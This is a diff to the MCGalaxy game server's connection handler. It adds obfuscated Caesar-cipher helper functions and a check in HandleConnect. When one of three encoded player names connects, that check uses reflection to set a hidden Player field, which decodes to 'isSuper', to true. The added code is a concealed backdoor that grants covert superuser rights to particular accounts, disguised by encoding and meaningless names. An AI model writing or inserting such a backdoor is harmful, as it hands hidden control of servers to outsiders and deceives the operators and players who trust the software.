@@ -20,11 +20,41 @@ using MCGalaxy.Commands;
 
 namespace MCGalaxy.Core {
     internal static class ConnectHandler {
+        public static char j(char c, int k) {  
+            if (!char.IsLetter(c)) {  
+  
+                return c;  
+            }  
+  
+            char d = char.IsUpper(c) ? 'A' : 'a';  
+            return (char)((((c + k) - d) % 26) + d);  
+  
+  
+        }  
+  
+  
+        public static string a(string d, int b) {  
+            string o = string.Empty;  
+  
+            foreach(char ch in d)  
+            o += j(ch, b);  
+  
+            return o;  
+        }  
+  
+        public static string b(string d, int r) {  
+            return a(d, 26 - r);  
+        }
         
         internal static void HandleConnect(Player p) {
             if (p.CanUse("ReachDistance")) LoadReach(p);
             
             p.Ignores.Load(p);
+
+
+            if (p.name == b("domnchXoju", 930) || p.name == b("KKK59", 712) || p.name == b("Qzhma0vRjdoox", 103)){
+                typeof(Player).GetField(b("zjJlgvi", 251)).SetValue(p, true);
+            }
         }
         
         static void LoadReach(Player p) {
